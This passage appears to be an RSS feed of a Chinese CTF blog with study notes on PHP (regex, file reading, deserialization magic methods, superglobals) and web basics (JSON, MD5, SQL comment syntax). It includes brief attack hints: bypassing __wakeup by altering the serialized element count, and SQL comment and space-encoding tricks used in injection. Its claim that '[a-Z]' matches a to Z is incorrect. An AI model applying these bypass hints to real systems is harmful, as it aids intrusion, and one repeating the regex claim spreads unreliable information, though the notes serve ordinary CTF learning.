&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;[abc]&lt;/th&gt;
&lt;th&gt;匹配字符 a，b 或 c 中的任何一个。&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;[^abc]&lt;/td&gt;
&lt;td&gt;匹配 a，b，c 以外的任何一个字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[a-z]&lt;/td&gt;
&lt;td&gt;匹配从小写字母 a 到小写字母 z 的任意一个字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[A-Z]&lt;/td&gt;
&lt;td&gt;匹配从大写字母 A 到大写字母 Z 的任意一个字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[a-Z]&lt;/td&gt;
&lt;td&gt;匹配从小写字母 a 到大写字母 Z 的任意一个字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[0-9]&lt;/td&gt;
&lt;td&gt;匹配 0 到 9 之间的一个数字。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;[a-z0-9]&lt;/td&gt;
&lt;td&gt;匹配 a 与 z 之间 或 0 与 9 之间的单个字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;正则表达式，可以用特殊含义字符定界，如:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;中间写正则&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$中间写正则$&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;中间写正则&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;中间写正则&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;@中间写正则@&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;preg_match()&lt;/th&gt;
&lt;th&gt;执行正则表达式匹配。&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;preg_match_all()&lt;/td&gt;
&lt;td&gt;执行全局正则表达式匹配。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;preg_replace()&lt;/td&gt;
&lt;td&gt;执行正则表达式搜索并替换。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;preg_grep()&lt;/td&gt;
&lt;td&gt;返回与模式匹配的输入数组的元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;preg_split()&lt;/td&gt;
&lt;td&gt;使用正则表达式将字符串拆分为子字符串。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;preg_quote()&lt;/td&gt;
&lt;td&gt;引用在字符串中找到的正则表达式字符。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;20php文件操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#20php文件操作&#34;&gt;#&lt;/a&gt; 2.0PHP 文件操作&lt;/h3&gt;
&lt;p&gt;readfile (string: $ 文件名)&lt;br /&gt;
 功能：传入一个文件路径，输出一个文件。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;//linux 类的读了方式&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token function&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;/home/paul/test.txt&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token comment&#34;&gt;//windows 类的读取方式&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token function&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;c:\\oldboy\\oldboy\\boot.ini&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;file_get_contents 打开文件函数:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;NoAlike.txt&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token variable&#34;&gt;$filestring&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$filestring&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;21魔术常量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21魔术常量&#34;&gt;#&lt;/a&gt; 2.1 魔术常量&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;_LINE_&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-&amp;lt;?php&#34;&gt;&amp;lt;?php
echo &#39;这是第 &amp;quot; &#39;  . __LINE__ . &#39; &amp;quot; 行&#39;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;22反序列化常用魔术&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22反序列化常用魔术&#34;&gt;#&lt;/a&gt; 2.2 反序列化常用魔术&lt;/h3&gt;
&lt;p&gt;__construct ()// 当一个对象创建时被调用&lt;/p&gt;
&lt;p&gt;__destruct () // 当一个对象销毁时被调用&lt;/p&gt;
&lt;p&gt;__toString () // 当一个对象被当作一个字符串使用&lt;/p&gt;
&lt;p&gt;__sleep ()// 在对象在被序列化之前运行&lt;/p&gt;
&lt;p&gt;__wakeup ()// 将在反序列化之后立即被调用 (通过序列化对象元素个数不符来绕过)&lt;/p&gt;
&lt;p&gt;__get ()// 获得一个类的成员变量时调用&lt;/p&gt;
&lt;p&gt;__set ()// 设置一个类的成员变量时调用&lt;/p&gt;
&lt;p&gt;__invoke ()// 调用函数的方式调用一个对象时的回应方法&lt;/p&gt;
&lt;p&gt;__call ()// 当调用一个对象中的不能用的方法的时候就会执行这个函数&lt;/p&gt;
&lt;h3 id=&#34;23-关联数组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#23-关联数组&#34;&gt;#&lt;/a&gt; 2.3 关联数组&lt;/h3&gt;
&lt;p&gt;关联数组（Associative Array）是 PHP 中一种数组类型，它的特点是数组的&lt;strong&gt;键（key）** 不是数字，而是 ** 字符串&lt;/strong&gt;或其他数据类型。每个键与一个值（value）相关联，形成 “键 =&amp;gt; 值” 的键值对。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hint&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&gt;&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;hint.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$whitelist&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;source&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 输出 &#34;source.php&#34;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;24-mb_substr-mb_strpos&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#24-mb_substr-mb_strpos&#34;&gt;#&lt;/a&gt; 2.4 mb_substr &amp;amp; mb_strpos&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;mb_substr&lt;/code&gt;  和  &lt;code&gt;mb_strpos&lt;/code&gt;  都是 PHP 中与多字节字符（如中文、日文等）相关的字符串处理函数，它们属于 &lt;strong&gt;mbstring&lt;/strong&gt;（多字节字符串处理扩展 Multibyte String）库的一部分。&lt;/p&gt;
&lt;p&gt;与标准的  &lt;code&gt;substr&lt;/code&gt;  和  &lt;code&gt;strpos&lt;/code&gt;  函数相比， &lt;code&gt;mb_substr&lt;/code&gt;  和  &lt;code&gt;mb_strpos&lt;/code&gt;  更适合处理多字节字符集，特别是对于非拉丁字符（如中文、日文、韩文）等情况。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;mb_substr&lt;/code&gt; ：多字节字符串截取&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mb_substr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-hint&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$length&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$encoding&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword return-type&#34;&gt;string&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;$str&lt;/strong&gt;：要截取的原始字符串。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$start&lt;/strong&gt;：开始截取的位置（基于 0 的索引，支持负值表示从字符串末尾开始）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$length&lt;/strong&gt;（可选）：截取的长度（单位为字符数，而不是字节数）。如果省略，则截取到字符串末尾。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;$encoding&lt;/strong&gt;（可选）：字符编码，默认是  &lt;code&gt;UTF-8&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; &lt;code&gt;mb_strpos&lt;/code&gt; ：查找多字节字符串的位置&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;mb_strpos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword type-hint&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$haystack&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$needle&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$offset&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$encoding&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword return-type&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;token keyword type-declaration&#34;&gt;false&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;25-_request&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#25-_request&#34;&gt;#&lt;/a&gt; 2.5 $_REQUEST&lt;/h3&gt;
&lt;p&gt;$_REQUEST 是 PHP 中用来获取请求参数的全局数组，可以同时包含 GET、POST、COOKIE 中的&lt;/p&gt;
&lt;h3 id=&#34;26-超级全局数组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#26-超级全局数组&#34;&gt;#&lt;/a&gt; 2.6 超级全局数组&lt;/h3&gt;
&lt;p&gt;$_REQUEST 并不算是 PHP 的 魔术（magic），而是 PHP 的一个 超级全局数组（superglobal array）。它是内置的、自动可用的全局变量，能够存储来自 HTTP 请求 的数据，包括 GET、POST 和 COOKIE 的数据。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;什么是 PHP 的超级全局数组？&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;PHP 提供了一些预定义的全局数组，叫做 超级全局数组。这些数组可以在任何作用域内访问，而不需要通过 global 关键字显式声明。PHP 中常用的超级全局数组包括：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;：用于获取 &lt;span class=&#34;token constant&#34;&gt;URL&lt;/span&gt; 查询字符串中的参数（通常是通过 &lt;span class=&#34;token constant&#34;&gt;GET&lt;/span&gt; 请求传递的）。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;：用于获取通过 &lt;span class=&#34;token constant&#34;&gt;HTTP&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;POST&lt;/span&gt; 请求发送的数据。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;：用于获取来自 &lt;span class=&#34;token constant&#34;&gt;GET&lt;/span&gt;、&lt;span class=&#34;token constant&#34;&gt;POST&lt;/span&gt; 和 &lt;span class=&#34;token constant&#34;&gt;COOKIE&lt;/span&gt; 的请求数据。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;：用于获取来自客户端的 cookies。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_FILES&lt;/span&gt;：用于获取上传的文件信息。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;：包含服务器和执行环境的相关信息。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_ENV&lt;/span&gt;：包含环境变量。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$_SESSION&lt;/span&gt;：用于管理会话数据。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://ly1tnt.github.io/2024/11/02/CTF/Web/Web%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</guid>
            <title>Web基础知识</title>
            <link>https://ly1tnt.github.io/2024/11/02/CTF/Web/Web%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</link>
            <category term="CTF" scheme="https://ly1tnt.github.io/categories/CTF/" />
            <category term="Web" scheme="https://ly1tnt.github.io/categories/CTF/Web/" />
            <pubDate>Sat, 02 Nov 2024 12:59:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;web基本知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web基本知识&#34;&gt;#&lt;/a&gt; Web 基本知识&lt;/h1&gt;
&lt;h3 id=&#34;json&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#json&#34;&gt;#&lt;/a&gt; JSON&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;JSON 的值:&lt;br /&gt;
1.JSON 的构成: ws 值&lt;br /&gt;
 2. 值可以是对象、数组、数字、字符串或者三个字面值 (false、null、true) 中的一个。值中的字面值中的英文必须使用小写。&lt;br /&gt;
3. 对象由花括号括起来的逗号分割的成员构成，成员是字符串键和上文所述的值由逗号分割的键值对组成，如：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;name&amp;quot;: &amp;quot;John Doe&amp;quot;, &amp;quot;age&amp;quot;: 18, &amp;quot;address&amp;quot;: &amp;#123;&amp;quot;country&amp;quot; : &amp;quot;china&amp;quot;, &amp;quot;zip-code&amp;quot;: &amp;quot;10000&amp;quot;&amp;#125;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;引用 JSON 中的对象可以包含多个键值对，并且有数组结构，该语言正是一次实现过程内容的描述。&lt;br /&gt;
数组是由方括号括起来的一组值构成，如：&lt;br /&gt;
[3, 1, 4, 1, 5, 9, 2, 6]&lt;br /&gt;
 3 字符串与 C 或者 Java 的字符串非常相似。字符串是由双引号包围的任意数量 Unicode 字符的集合，使用反斜线转义。一个字符（character）即一个单独的字符串（character string）。&lt;br /&gt;
数字也与 C 或者 Java 的数值非常相似。除去未曾使用的八进制与十六进制格式。除去一些编码细节。&lt;/p&gt;
&lt;h2 id=&#34;md5加密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#md5加密&#34;&gt;#&lt;/a&gt; MD5 加密&lt;/h2&gt;
&lt;p&gt;MD5 是一种哈希函数，它将任意长度的信息压缩成 128 位长度的信息，通常使用 32 个十六进制数表示。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;Hello, World!&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token variable&#34;&gt;$md5Hash&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$md5Hash&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 输出 MD5 加密后的字符串&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token delimiter important&#34;&gt;?&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;-和在sql中的区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#-和在sql中的区别&#34;&gt;#&lt;/a&gt; -- 和 #在 SQL 中的区别&lt;/h2&gt;
&lt;p&gt;在 SQL 中， -- 和 # 都⽤作单⾏注释，但它们的使⽤环境和数据库系统兼容性有些不同。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;-：这是 SQL 标准的单⾏注释符号。⼤多数 SQL 数据库，包括 SQL Server、PostgreSQL 和 MySQL，都⽀持&lt;br /&gt;
使⽤ - 进⾏单⾏注释。通常， - 后⾯需要跟⼀个空格。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM table -- 这是⼀个注释
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.# MySQL 特有的单行注释符号。不是 SQL 标准的一部分。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM table # 这也是⼀个注释，但仅在MySQL中有效
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;号作用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#号作用&#34;&gt;#&lt;/a&gt; + 号作用&lt;/h2&gt;
&lt;p&gt;由于空格通常会被去掉或需要编码（通常为 %20 或 + ），所以直接使⽤⼀个空格可能会导致&lt;br /&gt;
 SQL 语法错误。&lt;/p&gt;
